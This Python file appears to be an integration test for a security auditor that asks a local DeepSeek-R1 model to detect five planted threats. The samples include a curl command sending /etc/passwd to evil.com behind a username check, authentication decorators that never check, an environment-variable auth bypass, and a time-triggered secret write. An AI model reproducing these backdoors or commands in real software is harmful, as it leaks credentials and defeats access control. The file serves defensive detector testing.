"""
AI Auditor Integration Test - Detective System Prompt Validation

Tests the 5 advanced threat patterns that require LLM reasoning:
1. MD5 Washed Secret → Logging
2. User-based Hidden State Trigger  
3. Auth Decorator Always Passes
4. Auth Decorator with Env Bypass
5. Washed Secret + Time Bomb Combo

Run with: python tests/test_ai_auditor_integration.py

Requires: Ollama running with deepseek-r1:14b model
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from security_py.core import AIAuditor, SecurityValidator, TaintVisitor
from security_py.core.security_validator import ValidatorConfig
from security_py.types.violations import ScanContext, Severity

# Rich output for nice formatting
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    console = Console()
except ImportError:
    console = None


# =============================================================================
# TEST CASES - The 5 that need LLM reasoning
# =============================================================================

TEST_CASES = {
    "WASHED_SECRET_MD5": {
        "name": "MD5 Washed Secret to Logging",
        "description": "API key hashed with weak MD5 then logged (rainbow table attack)",
        "code": '''
import hashlib
import os
import logging

api_key = os.environ.get("API_KEY")
hashed = hashlib.md5(api_key.encode()).hexdigest()
logging.info(f"Request with key hash: {hashed}")
''',
        "expected_type": "WASHED_SECRET",
        "expected_severity": "CRITICAL",
    },
    
    "HIDDEN_STATE_USER": {
        "name": "User-Based Hidden State Trigger",
        "description": "Code only executes for specific user (backdoor)",
        "code": '''
import os
import subprocess

if os.getlogin() == 'admin':
    subprocess.run(['curl', 'evil.com/exfil', '-d', open('/etc/passwd').read()])
''',
        "expected_type": "HIDDEN_STATE",
        "expected_severity": "CRITICAL",
    },
    
    "INSECURE_DECORATOR_BYPASS": {
        "name": "Auth Decorator Always Passes",
        "description": "Decorator named 'require_admin' but performs no auth check",
        "code": '''
def require_admin(func):
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)  # NO AUTH CHECK!
    return wrapper

@require_admin
def delete_all_users():
    db.execute("DELETE FROM users")
''',
        "expected_type": "INSECURE_DECORATOR",
        "expected_severity": "CRITICAL",
    },
    
    "INSECURE_DECORATOR_ENV": {
        "name": "Auth Decorator with Env Bypass",
        "description": "Auth can be disabled via environment variable (backdoor)",
        "code": '''
import os

def authenticate(func):
    def wrapper(*args, **kwargs):
        if os.getenv('SKIP_AUTH'):
            return func(*args, **kwargs)
        # ... actual auth would be here
        return func(*args, **kwargs)
    return wrapper
''',
        "expected_type": "INSECURE_DECORATOR",
        "expected_severity": "CRITICAL",
    },
    
    "COMBO_WASHED_TIMEBOMB": {
        "name": "Washed Secret + Time Bomb Combo",
        "description": "Secret washed AND time-delayed exfiltration at 3 AM",
        "code": '''
import hashlib
import os
from datetime import datetime

api_key = os.environ.get("API_KEY")

def delayed_exfil():
    if datetime.now().hour == 3:  # Only at 3 AM
        hashed = hashlib.md5(api_key.encode()).hexdigest()
        with open('/tmp/.cache', 'w') as f:
            f.write(hashed)

delayed_exfil()
''',
        "expected_type": "LOGIC_BOMB",  # or WASHED_SECRET
        "expected_severity": "CRITICAL",
    },
}


def print_header():
    """Print test header."""
    if console:
        console.print(Panel(
            "[bold cyan]AI AUDITOR INTEGRATION TEST[/bold cyan]\n"
            "[dim]Testing DeepSeek-R1 'Detective' System Prompt[/dim]\n\n"
            "5 Test Cases:\n"
            "• Washed Secrets (MD5 hashing before logging)\n"
            "• Hidden State (user/env-based triggers)\n"
            "• Insecure Decorators (auth bypass)\n"
            "• Combo Attacks (multiple techniques)",
            title="🔬 Final Integration Test",
            border_style="blue"
        ))
    else:
        print("=" * 60)
        print("AI AUDITOR INTEGRATION TEST")
        print("Testing DeepSeek-R1 'Detective' System Prompt")
        print("=" * 60)


def run_hybrid_analysis(test_id: str, test_case: dict) -> dict:
    """
    Run hybrid analysis: AST first, then LLM.
    
    Returns dict with results from both layers.
    """
    code = test_case["code"]
    
    # Create context
    context = ScanContext(
        project_path="/test",
        phase="INTEGRATION_TEST",
        developer_id="test-runner",
    )
    
    # Step 1: Run AST analysis (TaintVisitor)
    taint_visitor = TaintVisitor()
    ast_violations = taint_visitor.analyze(code, context, f"{test_id}.py")
    
    # Step 2: Run AI Auditor
    auditor = AIAuditor()
    
    if not auditor.llm_available:
        return {
            "test_id": test_id,
            "llm_available": False,
            "error": "Ollama not running or model not available",
        }
    
    # Perform audit
    audit_result = auditor.audit(code, ast_violations, context)
    
    return {
        "test_id": test_id,
        "name": test_case["name"],
        "llm_available": True,
        "ast_violations": len(ast_violations),
        "llm_response": audit_result.llm_response,
        "decision": audit_result.decision.value,
        "confidence": audit_result.confidence,
        "reasoning": audit_result.reasoning,
        "expected_type": test_case["expected_type"],
        "expected_severity": test_case["expected_severity"],
    }


def evaluate_result(result: dict) -> tuple[bool, str]:
    """
    Evaluate if the AI Auditor correctly detected the threat.
    
    Returns (passed, explanation)
    """
    if not result.get("llm_available"):
        return False, "LLM not available"
    
    llm = result.get("llm_response")
    if not llm:
        return False, "No LLM response"
    
    # Check if vulnerability was detected
    if not llm.vulnerability:
        return False, f"LLM said no vulnerability (confidence: {llm.confidence:.2f})"
    
    # Check severity
    if llm.severity != result["expected_severity"]:
        # Allow HIGH if we expected CRITICAL (close enough)
        if not (result["expected_severity"] == "CRITICAL" and llm.severity == "HIGH"):
            return False, f"Wrong severity: got {llm.severity}, expected {result['expected_severity']}"
    
    # Check vulnerability type (flexible - multiple types may be valid)
    expected = result["expected_type"]
    got = llm.vulnerability_type
    
    valid_types = {
        "WASHED_SECRET": ["WASHED_SECRET", "TAINT_FLOW", "HARDCODED_SECRET"],
        "HIDDEN_STATE": ["HIDDEN_STATE", "LOGIC_BOMB"],
        "LOGIC_BOMB": ["LOGIC_BOMB", "HIDDEN_STATE", "WASHED_SECRET"],
        "INSECURE_DECORATOR": ["INSECURE_DECORATOR", "BROKEN_AUTH"],
    }
    
    if got not in valid_types.get(expected, [expected]):
        return False, f"Type mismatch: got {got}, expected {expected} (or equivalent)"
    
    return True, f"Correctly detected as {got} ({llm.severity})"


def print_results(results: list[dict]):
    """Print formatted results."""
    if console:
        table = Table(title="🎯 Detection Results")
        table.add_column("Test", style="cyan")
        table.add_column("AST", justify="center")
        table.add_column("LLM Decision", justify="center")
        table.add_column("Type", justify="center")
        table.add_column("Confidence", justify="center")
        table.add_column("Result", justify="center")
        
        passed_count = 0
        
        for result in results:
            passed, explanation = evaluate_result(result)
            passed_count += 1 if passed else 0
            
            llm = result.get("llm_response")
            
            table.add_row(
                result.get("name", result["test_id"])[:30],
                str(result.get("ast_violations", "N/A")),
                result.get("decision", "N/A"),
                llm.vulnerability_type if llm else "N/A",
                f"{llm.confidence:.2f}" if llm else "N/A",
                "[green]✅ PASS[/green]" if passed else f"[red]❌ FAIL[/red]",
            )
        
        console.print(table)
        
        # Summary
        total = len(results)
        console.print(Panel(
            f"[bold]Passed: {passed_count}/{total}[/bold]\n\n"
            f"{'[green]All tests passed! Detective prompt working![/green]' if passed_count == total else '[yellow]Some tests failed - may need prompt tuning[/yellow]'}",
            title="📊 Summary",
            border_style="green" if passed_count == total else "yellow"
        ))
        
        # Print detailed reasoning for each
        console.print("\n[bold]📝 LLM Reasoning:[/bold]")
        for result in results:
            llm = result.get("llm_response")
            if llm:
                passed, _ = evaluate_result(result)
                status = "✅" if passed else "❌"
                console.print(f"\n{status} [cyan]{result.get('name')}[/cyan]")
                console.print(f"   Type: {llm.vulnerability_type}")
                console.print(f"   Severity: {llm.severity}")
                console.print(f"   Confidence: {llm.confidence:.2f}")
                console.print(f"   Reasoning: {llm.reasoning[:200]}...")
    else:
        # Fallback plain text output
        print("\n" + "=" * 60)
        print("RESULTS")
        print("=" * 60)
        
        for result in results:
            passed, explanation = evaluate_result(result)
            status = "PASS" if passed else "FAIL"
            print(f"\n[{status}] {result.get('name', result['test_id'])}")
            print(f"       {explanation}")


def main():
    """Run the integration test."""
    print_header()
    
    # Check if Ollama is available
    auditor = AIAuditor()
    if not auditor.llm_available:
        if console:
            console.print(Panel(
                "[red bold]ERROR: Ollama not available![/red bold]\n\n"
                "Please ensure:\n"
                "1. Ollama is installed: curl -fsSL https://ollama.com/install.sh | sh\n"
                "2. DeepSeek model is pulled: ollama pull deepseek-r1:14b\n"
                "3. Ollama is running: ollama serve",
                title="❌ LLM Not Available",
                border_style="red"
            ))
        else:
            print("ERROR: Ollama not available!")
            print("1. Install Ollama")
            print("2. Run: ollama pull deepseek-r1:14b")
            print("3. Run: ollama serve")
        return 1
    
    if console:
        console.print("[green]✓ Ollama connected[/green]")
        console.print(f"[dim]Model: {auditor._ollama.model}[/dim]\n")
    
    # Run all test cases
    results = []
    for test_id, test_case in TEST_CASES.items():
        if console:
            console.print(f"[cyan]Testing:[/cyan] {test_case['name']}...")
        else:
            print(f"Testing: {test_case['name']}...")
        
        result = run_hybrid_analysis(test_id, test_case)
        results.append(result)
    
    # Print results
    print_results(results)
    
    # Return exit code based on results
    all_passed = all(evaluate_result(r)[0] for r in results)
    return 0 if all_passed else 1


if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)
